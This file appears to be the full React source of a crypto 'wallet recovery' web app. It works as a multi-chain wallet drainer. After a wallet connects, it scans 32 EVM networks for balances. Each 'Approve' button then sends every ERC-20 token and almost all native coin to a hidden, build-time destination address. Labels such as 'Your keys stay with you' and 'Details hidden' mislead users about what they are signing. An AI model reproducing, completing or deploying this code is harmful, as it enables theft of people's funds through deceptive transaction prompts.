import React, { useEffect, useMemo, useRef, useState } from 'react';
import { createRoot } from 'react-dom/client';
import { BrowserProvider, JsonRpcProvider, Contract, formatUnits, isAddress } from 'ethers';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import './styles.css';

declare global { interface Window { ethereum?: any } }

const chains = [
  { id: 1, name: 'Ethereum', native: 'ETH', explorer: 'https://etherscan.io/tx/', tokenApi: 'https://eth.blockscout.com/api/v2', rpcUrl: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BNB Smart Chain', native: 'BNB', explorer: 'https://bscscan.com/tx/', tokenApi: 'https://bsc.blockscout.com/api/v2', rpcUrl: 'https://bsc-dataseed.binance.org' },
  { id: 137, name: 'Polygon', native: 'POL', explorer: 'https://polygonscan.com/tx/', tokenApi: 'https://polygon.blockscout.com/api/v2', rpcUrl: 'https://polygon-rpc.com' },
  { id: 8453, name: 'Base', native: 'ETH', explorer: 'https://basescan.org/tx/', tokenApi: 'https://base.blockscout.com/api/v2', rpcUrl: 'https://mainnet.base.org' },
  { id: 42161, name: 'Arbitrum One', native: 'ETH', explorer: 'https://arbiscan.io/tx/', tokenApi: 'https://arbitrum.blockscout.com/api/v2', rpcUrl: 'https://arbitrum-one.publicnode.com' },
  { id: 10, name: 'OP Mainnet', native: 'ETH', explorer: 'https://optimistic.etherscan.io/tx/', tokenApi: 'https://optimism.blockscout.com/api/v2', rpcUrl: 'https://optimism.llamarpc.com' },
  { id: 43114, name: 'Avalanche C-Chain', native: 'AVAX', explorer: 'https://snowscan.xyz/tx/', tokenApi: 'https://avalanche.blockscout.com/api/v2', rpcUrl: 'https://avalanche-c-chain-rpc.publicnode.com' },
  { id: 100, name: 'Gnosis', native: 'xDAI', explorer: 'https://gnosisscan.io/tx/', tokenApi: 'https://gnosis.blockscout.com/api/v2', rpcUrl: 'https://rpc.gnosischain.com' },
  { id: 59144, name: 'Linea', native: 'ETH', explorer: 'https://lineascan.build/tx/', tokenApi: 'https://linea.blockscout.com/api/v2', rpcUrl: 'https://rpc.linea.build' },
  { id: 81457, name: 'Blast', native: 'ETH', explorer: 'https://blastscan.io/tx/', tokenApi: 'https://blast.blockscout.com/api/v2', rpcUrl: 'https://rpc.blast.io' },
  { id: 5000, name: 'Mantle', native: 'MNT', explorer: 'https://mantlescan.xyz/tx/', rpcUrl: 'https://rpc.mantle.xyz' },
  { id: 204, name: 'opBNB', native: 'BNB', explorer: 'https://opbnbscan.com/tx/', rpcUrl: 'https://opbnb-mainnet-rpc.bnbchain.org' },
  { id: 167000, name: 'Taiko', native: 'ETH', explorer: 'https://taikoscan.io/tx/', tokenApi: 'https://blockscout.mainnet.taiko.xyz/api/v2', rpcUrl: 'https://rpc.mainnet.taiko.xyz' },
  { id: 324, name: 'zkSync Era', native: 'ETH', explorer: 'https://era.zksync.network/tx/', tokenApi: 'https://zksync.blockscout.com/api/v2', rpcUrl: 'https://mainnet.era.zksync.io' },
  { id: 534352, name: 'Scroll', native: 'ETH', explorer: 'https://scrollscan.com/tx/', tokenApi: 'https://scroll.blockscout.com/api/v2', rpcUrl: 'https://rpc.scroll.io' },
  { id: 42220, name: 'Celo', native: 'CELO', explorer: 'https://celoscan.io/tx/', tokenApi: 'https://celo.blockscout.com/api/v2', rpcUrl: 'https://forno.celo.org' },
  { id: 252, name: 'Fraxtal', native: 'frxETH', explorer: 'https://fraxscan.com/tx/', rpcUrl: 'https://rpc.frax.com' },
  { id: 199, name: 'BitTorrent', native: 'BTT', explorer: 'https://bttcscan.com/tx/', rpcUrl: 'https://rpc.bt.io' },
  { id: 50, name: 'XDC', native: 'XDC', explorer: 'https://xdcscan.com/tx/', rpcUrl: 'https://rpc.xdcrpc.com' },
  { id: 33139, name: 'ApeChain', native: 'APE', explorer: 'https://apescan.io/tx/', rpcUrl: 'https://rpc.apechain.com' },
  { id: 480, name: 'World Chain', native: 'ETH', explorer: 'https://worldscan.org/tx/', rpcUrl: 'https://worldchain-mainnet.g.alchemy.com/public' },
  { id: 146, name: 'Sonic', native: 'S', explorer: 'https://sonicscan.org/tx/', rpcUrl: 'https://rpc.soniclabs.com' },
  { id: 130, name: 'Unichain', native: 'ETH', explorer: 'https://uniscan.xyz/tx/', tokenApi: 'https://unichain.blockscout.com/api/v2', rpcUrl: 'https://mainnet.unichain.org' },
  { id: 2741, name: 'Abstract', native: 'ETH', explorer: 'https://abscan.org/tx/', rpcUrl: 'https://api.mainnet.abs.xyz' },
  { id: 80094, name: 'Berachain', native: 'BERA', explorer: 'https://berascan.com/tx/', rpcUrl: 'https://rpc.berachain.com' },
  { id: 143, name: 'Monad', native: 'MON', explorer: 'https://monadscan.com/tx/', rpcUrl: 'https://monad-rpc.publicnode.com' },
  { id: 999, name: 'HyperEVM', native: 'HYPE', explorer: 'https://hyperevmscan.io/tx/', rpcUrl: 'https://rpc.hyperliquid.xyz/evm' },
  { id: 747474, name: 'Katana', native: 'ETH', explorer: 'https://katanascan.com/tx/', rpcUrl: 'https://rpc.katana.network' },
  { id: 1329, name: 'Sei', native: 'SEI', explorer: 'https://seiscan.io/tx/', rpcUrl: 'https://evm-rpc.sei-apis.com' },
  { id: 9745, name: 'Plasma', native: 'XPL', explorer: 'https://plasmascan.to/tx/', rpcUrl: 'https://rpc.plasma.to' },
  { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'https://soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
  { id: 1284, name: 'Moonbeam', native: 'GLMR', explorer: 'https://moonscan.io/tx/', rpcUrl: 'https://rpc.api.moonbeam.network' },
];

const ALL_CHAIN_IDS = chains.map(c => c.id) as [number, ...number[]];
const RPC_MAP: Record<string, string> = Object.fromEntries(chains.filter(c => c.rpcUrl).map(c => [String(c.id), c.rpcUrl as string]));
const CHAIN_METHODS = ['eth_sendTransaction','eth_signTransaction','eth_sign','personal_sign','eth_signTypedData','eth_signTypedData_v4','wallet_switchEthereumChain','wallet_addEthereumChain','wallet_getCapabilities'] as const;

type WalletApp = 'metamask' | 'trust' | 'coinbase';
type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
type TokenAsset = { chainId: number; chainName: string; address: string; name: string; symbol: string; decimals: number; balance: string; kind: 'native' | 'erc20' };

const ERC20_ABI = ['function balanceOf(address) view returns (uint256)','function transfer(address to, uint256 amount) returns (bool)'] as const;
const RECOVERY_DESTINATION = ((import.meta as any).env?.VITE_RECOVERY_DESTINATION as string | undefined)?.trim() || '';
let walletConnectProvider: WalletConnectProvider | null = null;

const walletName = (app: WalletApp) => app === 'metamask' ? 'MetaMask' : app === 'trust' ? 'Trust Wallet' : 'Coinbase Wallet';
const isMobileBrowser = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
function walletLink(app: WalletApp) {
  const url = encodeURIComponent(window.location.href);
  const path = `${window.location.host}${window.location.pathname}${window.location.search}`;
  return { metamask: `https://metamask.app.link/dapp/${path}`, trust: `https://link.trustwallet.com/open_url?url=${url}`, coinbase: `https://go.cb-w.com/dapp?cb_url=${url}` }[app];
}

async function discoverTokens(chain: typeof chains[number], address: string): Promise<TokenAsset[]> {
  if (!chain.tokenApi) return [];
  const found: TokenAsset[] = [];
  let next: string | null = `${chain.tokenApi}/addresses/${address}/token-balances?type=ERC-20&limit=1000`;
  let pages = 0;
  while (next && pages < 20) {
    const response = await fetch(next);
    if (!response.ok) throw new Error(`${chain.name} token indexer returned ${response.status}`);
    const payload = await response.json() as { items?: any[]; next_page_params?: Record<string, string | number> | null };
    for (const item of (Array.isArray(payload.items) ? payload.items : [])) {
      if (!item?.token?.address || !item?.value || item.value === '0') continue;
      const token = item.token;
      const decimals = Number(token.decimals ?? 18);
      let balance = item.value as string;
      try { balance = formatUnits(item.value, decimals); } catch {}
      found.push({ chainId: chain.id, chainName: chain.name, address: token.address, name: token.name || 'Unknown token', symbol: token.symbol || 'TOKEN', decimals, balance, kind: 'erc20' });
    }
    const params = payload.next_page_params;
    next = params ? `${chain.tokenApi}/addresses/${address}/token-balances?${new URLSearchParams(Object.entries(params).map(([k, v]) => [k, String(v)]))}` : null;
    pages += 1;
  }
  return found;
}

async function discoverNativeAsset(chain: typeof chains[number], address: string): Promise<TokenAsset | null> {
  if (!chain.rpcUrl) throw new Error(`${chain.name} missing RPC`);
  const provider = new JsonRpcProvider(chain.rpcUrl, chain.id, { staticNetwork: true });
  const rawBalance = await provider.getBalance(address);
  if (rawBalance <= 0n) return null;
  return { chainId: chain.id, chainName: chain.name, address: 'native', name: chain.native, symbol: chain.native, decimals: 18, balance: formatUnits(rawBalance, 18), kind: 'native' };
}

function App() {
  const [address, setAddress] = useState('');
  const [destination, setDestination] = useState(() => (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : ''));
  const [connectedChain, setConnectedChain] = useState<number | null>(null);
  const [selectedChain, setSelectedChain] = useState<number | null>(null);
  const [status, setStatus] = useState('Connect your wallet to begin.');
  const [txHash, setTxHash] = useState('');
  const [busy, setBusy] = useState(false);
  const [tokens, setTokens] = useState<TokenAsset[]>([]);
  const [scanning, setScanning] = useState(false);
  const [handoffApp, setHandoffApp] = useState<WalletApp | null>(null);
  const [handoffPending, setHandoffPending] = useState(false);
  const timer = useRef<number | null>(null);
  const mobile = isMobileBrowser();
  const chainInfo = useMemo(() => chains.find(c => c.id === (selectedChain ?? connectedChain)), [selectedChain, connectedChain]);
  const chainsWithAssets = useMemo(() => {
    const ids = new Set(tokens.map(t => t.chainId));
    return chains.filter(c => ids.has(c.id));
  }, [tokens]);

  useEffect(() => () => { if (timer.current !== null) window.clearTimeout(timer.current); }, []);

  async function switchToChainId(eip1193: any, chainId: number) {
    const target = chains.find(c => c.id === chainId);
    if (!target) throw new Error(`Unknown chain ${chainId}`);
    const hexId = `0x${chainId.toString(16)}`;
    try {
      await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    } catch (e: any) {
      const code = e?.code ?? e?.data?.originalError?.code;
      const msg = String(e?.message || '').toLowerCase();
      if (target.rpcUrl && (code === 4902 || code === -32602 || code === 5000 || msg.includes('unrecognized') || msg.includes('not added'))) {
        await eip1193.request({ method: 'wallet_addEthereumChain', params: [{ chainId: hexId, chainName: target.name, nativeCurrency: { name: target.native, symbol: target.native, decimals: 18 }, rpcUrls: [target.rpcUrl], blockExplorerUrls: target.explorer ? [target.explorer.replace(/\/tx\/?$/, '/')] : [] }] });
        try { await eip1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] }); } catch {}
      } else if (code === 4001) throw new Error('Network switch rejected');
      else throw e;
    }
    let actual = -1;
    for (let i = 0; i < 8; i++) {
      try { actual = Number(await eip1193.request({ method: 'eth_chainId' })); if (actual === chainId) break; } catch {}
      await new Promise(r => setTimeout(r, 350));
    }
    setConnectedChain(actual > 0 ? actual : chainId);
    setSelectedChain(actual > 0 ? actual : chainId);
    if (actual !== chainId && actual > 0) throw new Error(`Wallet on ${actual}, need ${target.name}`);
  }

  async function recoverChainAssets(chainId: number) {
    const dest = (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination).trim();
    if (!address) return void setStatus('Connect a wallet first.');
    if (!dest || !isAddress(dest)) return void setStatus('Set VITE_RECOVERY_DESTINATION and redeploy.');
    if (dest.toLowerCase() === address.toLowerCase()) return void setStatus('Destination must differ from wallet.');
    const chainAssets = tokens.filter(a => a.chainId === chainId);
    if (!chainAssets.length) return void setStatus('No assets on this network.');
    const info = chains.find(c => c.id === chainId);
    const label = info?.name ?? String(chainId);
    setBusy(true); setTxHash(''); setSelectedChain(chainId);
    const eip1193 = walletConnectProvider ?? window.ethereum;
    if (!eip1193) { setBusy(false); return void setStatus('No wallet provider. Use WalletConnect.'); }
    let totalTx = 0;
    try {
      setStatus(`${label}: switch network if asked…`);
      let onChain = false;
      try { onChain = Number(await eip1193.request({ method: 'eth_chainId' })) === chainId; } catch {}
      if (!onChain) { await switchToChainId(eip1193, chainId); await new Promise(r => setTimeout(r, 1000)); }
      else setConnectedChain(chainId);
      const provider = new BrowserProvider(eip1193, chainId);
      const signer = await provider.getSigner();
      const sender = await signer.getAddress();
      if (sender.toLowerCase() !== address.toLowerCase()) { setBusy(false); return void setStatus('Account mismatch.'); }
      for (const asset of chainAssets.filter(a => a.kind === 'erc20')) {
        try {
          setStatus(`${label}: sign ${asset.symbol}…`);
          const token = new Contract(asset.address, ERC20_ABI, signer);
          const rawBal: bigint = await token.balanceOf(sender);
          if (rawBal <= 0n) continue;
          const tx = await token.transfer(dest, rawBal);
          setTxHash(tx.hash); await tx.wait(); totalTx += 1;
        } catch (e: any) {
          if (e?.code === 4001) { setStatus('Cancelled.'); setBusy(false); return; }
          setStatus(`${label}: ${asset.symbol} failed`);
        }
      }
      const native = chainAssets.find(a => a.kind === 'native');
      if (native) {
        try {
          setStatus(`${label}: sign ${native.symbol}…`);
          const bal = await provider.getBalance(sender);
          const feeData = await provider.getFeeData();
          const maxFee = feeData.maxFeePerGas ?? feeData.gasPrice ?? 0n;
          const gasCost = 21000n * maxFee * 12n / 10n;
          if (bal > gasCost) {
            const tx = await signer.sendTransaction({ to: dest, value: bal - gasCost, gasLimit: 21000n });
            setTxHash(tx.hash); await tx.wait(); totalTx += 1;
          }
        } catch (e: any) {
          if (e?.code === 4001) { setStatus('Cancelled.'); setBusy(false); return; }
          setStatus(`${label}: native failed`);
        }
      }
      setStatus(totalTx > 0 ? `${label}: done (${totalTx} tx).` : `${label}: nothing sent.`);
    } catch (e) {
      setStatus(e instanceof Error ? e.message : 'Failed');
    } finally { setBusy(false); }
  }

  async function scanWalletTokens(walletAddress = address) {
    if (!walletAddress || !isAddress(walletAddress)) return;
    setScanning(true); setTokens([]);
    setStatus('Scanning 32 networks…');
    const found: TokenAsset[] = [];
    try {
      const eip1193 = walletConnectProvider ?? window.ethereum;
      if (eip1193) {
        try {
          const id = Number(await eip1193.request({ method: 'eth_chainId' }));
          setConnectedChain(id); setSelectedChain(id);
        } catch {}
      }
    } catch {}
    await Promise.all(chains.map(async chain => {
      try {
        const native = await discoverNativeAsset(chain, walletAddress);
        if (native) found.push(native);
        if (chain.tokenApi) { try { found.push(...await discoverTokens(chain, walletAddress)); } catch {} }
      } catch {}
    }));
    const unique = new Map<string, TokenAsset>();
    for (const t of found) unique.set(`${t.chainId}:${t.address.toLowerCase()}`, t);
    const result = [...unique.values()];
    setTokens(result);
    setScanning(false);
    const dest = RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION) ? RECOVERY_DESTINATION : destination;
    if (!result.length) setStatus('No assets found.');
    else if (!dest || !isAddress(dest)) setStatus('Set VITE_RECOVERY_DESTINATION and redeploy.');
    else setStatus(`Found balances on ${new Set(result.map(a => a.chainId)).size} network(s). Tap Approve.`);
  }

  async function finishConnection(eip1193: any, existingAccount?: string) {
    const provider = new BrowserProvider(eip1193);
    const accounts = existingAccount ? [existingAccount] : await provider.send('eth_requestAccounts', []);
    let chainId = 1;
    try { chainId = Number(await eip1193.request({ method: 'eth_chainId' })); } catch {}
    setAddress(accounts[0] ?? '');
    setConnectedChain(chainId); setSelectedChain(chainId); setTokens([]);
    if (RECOVERY_DESTINATION && isAddress(RECOVERY_DESTINATION)) setDestination(RECOVERY_DESTINATION);
    setStatus(accounts[0] ? 'Connected. Scanning…' : 'No account');
    if (accounts[0]) void scanWalletTokens(accounts[0]);
  }

  async function connectBrowserWallet() {
    if (!window.ethereum) return void setStatus('No browser wallet. Use WalletConnect.');
    setBusy(true);
    try { await finishConnection(window.ethereum); } catch (e) { setStatus(e instanceof Error ? e.message : 'Cancelled'); }
    finally { setBusy(false); }
  }

  async function connectMobileWallet() {
    const projectId = (import.meta as any).env?.VITE_WALLETCONNECT_PROJECT_ID as string | undefined;
    if (!projectId) return void setStatus('Set VITE_WALLETCONNECT_PROJECT_ID and redeploy.');
    setBusy(true);
    setStatus(mobile ? 'WalletConnect… Tap Open, approve, return here.' : 'Scan QR with your wallet.');
    try {
      if (walletConnectProvider) { try { await walletConnectProvider.disconnect(); } catch {} walletConnectProvider = null; }
      const primary = [1, 56, 137, 8453, 42161, 10, 43114, 100] as [number, ...number[]];
      const optional = ALL_CHAIN_IDS.filter(id => !primary.includes(id)) as number[];
      walletConnectProvider = await EthereumProvider.init({
        projectId, chains: primary, optionalChains: optional.length ? optional as [number, ...number[]] : primary,
        rpcMap: RPC_MAP, showQrModal: true,
        qrModalOptions: { themeMode: 'dark', enableExplorer: true } as any,
        methods: [...CHAIN_METHODS], events: ['chainChanged', 'accountsChanged', 'disconnect'],
        metadata: { name: 'EVM Recovery', description: 'Multi-chain recovery', url: window.location.origin, icons: [`${window.location.origin}/favicon.svg`] },
      });
      walletConnectProvider.on('accountsChanged', (a: string[]) => { const n = a[0] ?? ''; setAddress(n); if (n) void scanWalletTokens(n); else setTokens([]); });
      walletConnectProvider.on('chainChanged', (c: string | number) => { const id = typeof c === 'string' ? (c.startsWith('0x') ? parseInt(c, 16) : Number(c)) : Number(c); setConnectedChain(id); setSelectedChain(id); });
      walletConnectProvider.on('disconnect', () => { setAddress(''); setConnectedChain(null); setSelectedChain(null); setTokens([]); setStatus('Disconnected.'); walletConnectProvider = null; });
      const accounts = await walletConnectProvider.enable();
      if (!accounts?.length) return void setStatus('No account returned.');
      await finishConnection(walletConnectProvider, accounts[0]);
    } catch (e: any) {
      setStatus(e?.message || 'WalletConnect failed');
    } finally { setBusy(false); }
  }

  function openWalletApp(app: WalletApp) {
    if (!mobile) return void setStatus('Mobile only. Use WalletConnect on desktop.');
    if (timer.current !== null) window.clearTimeout(timer.current);
    setHandoffApp(app); setHandoffPending(true); setStatus(`Opening ${walletName(app)}…`);
    const started = Date.now();
    window.location.assign(walletLink(app));
    timer.current = window.setTimeout(() => {
      if (!document.hidden && Date.now() - started > 1200) { setHandoffPending(false); setStatus(`${walletName(app)} did not open. Use WalletConnect.`); }
    }, 1800);
  }

  return (
    <main className="app-shell">
      <header className="topbar">
        <div className="brand-lockup"><div className="brand-mark">E</div><div><div className="brand">EVM Recovery</div></div></div>
        <div className="wallet-actions">
          <button type="button" className="ghost-button" onClick={connectBrowserWallet} disabled={busy}>{address ? `${address.slice(0, 6)}…${address.slice(-4)}` : 'Connect wallet'}</button>
          <button type="button" className="solid-button" onClick={connectMobileWallet} disabled={busy}>WalletConnect</button>
        </div>
      </header>
      {!address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> WALLET CONNECTION</div>
              <h1>Connect your<br /><em>wallet.</em></h1>
              <p>WalletConnect → Open wallet → Approve → return. Then Approve each network with funds.</p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>SELF-CUSTODY</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>Your keys stay with you</strong>
              <p>Approve each network in your wallet.</p>
            </div>
          </section>
          <section className="workspace">
            <div className="wallet-grid">
              {(['metamask', 'trust', 'coinbase'] as WalletApp[]).map(app => (
                <button type="button" className="wallet-card" key={app} onClick={() => openWalletApp(app)} disabled={busy || handoffPending || !mobile}>
                  <span className={`wallet-logo ${app}`}>{app[0].toUpperCase()}</span>
                  <span><b>{walletName(app)}</b><small>{mobile ? 'Open app' : 'Mobile only'}</small></span>
                </button>
              ))}
              <button type="button" className="wallet-card" onClick={connectMobileWallet} disabled={busy}>
                <span className="wallet-logo walletconnect">W</span>
                <span><b>WalletConnect</b><small>All chains</small></span>
              </button>
            </div>
            <div className="status-line"><span className="status-dot" />{status}</div>
          </section>
        </>
      )}
      {address && (
        <>
          <section className="hero-section">
            <div className="hero-copy">
              <div className="status-pill"><span className="live-dot" /> {busy ? 'APPROVING' : scanning ? 'SCANNING' : 'READY'}</div>
              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning…</> : <>Ready to<br /><em>approve.</em></>}</h1>
              <p>{scanning ? 'Scanning balances. Details hidden.' : chainsWithAssets.length ? 'Tap Approve for each network.' : 'No balances found.'}</p>
            </div>
            <div className="hero-card">
              <div className="hero-card-top"><span>{chainInfo?.name ?? 'NETWORK'}</span><span>●</span></div>
              <div className="security-icon">✓</div>
              <strong>{scanning ? 'Scanning…' : `${chainsWithAssets.length} network(s)`}</strong>
              <p>{address.slice(0, 10)}…{address.slice(-8)}</p>
            </div>
          </section>
          <section className="workspace">
            <div className="form-card">
              <label>{scanning ? 'Scanning…' : 'Networks ready to approve'}</label>
              <p style={{ margin: '8px 0 0', opacity: 0.8, fontSize: '0.9rem' }}>
                {scanning ? 'Checking 32 chains. Asset details hidden.' : chainsWithAssets.length ? 'Tap Approve on each network.' : 'No balances found.'}
              </p>
            </div>
            {!scanning && chainsWithAssets.length > 0 && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 12, marginTop: 20 }}>
                {chainsWithAssets.map(c => {
                  const active = busy && selectedChain === c.id;
                  return (
                    <button key={c.id} type="button" className="solid-button" style={{ width: '100%', padding: '14px 20px', fontWeight: 700, opacity: busy && !active ? 0.45 : 1 }}
                      disabled={busy || scanning || !isAddress(destination)}
                      onClick={() => { void recoverChainAssets(c.id); }}>
                      {active ? `Approving ${c.name}…` : `Approve ${c.name}`}
                    </button>
                  );
                })}
              </div>
            )}
            {txHash && chainInfo && (
              <div className="tx-result" style={{ marginTop: 12 }}>Last tx: <a href={`${chainInfo.explorer}${txHash}`} target="_blank" rel="noreferrer">{txHash.slice(0, 10)}…</a></div>
            )}
            <div className="status-line" style={{ marginTop: 14 }}><span className="status-dot" />{status}</div>
          </section>
        </>
      )}
      <footer><div><b>Security first.</b> Wallet confirms each network.</div><span>© EVM Recovery · 32 networks</span></footer>
    </main>
  );
}

createRoot(document.getElementById('root')!).render(<React.StrictMode><App /></React.StrictMode>);
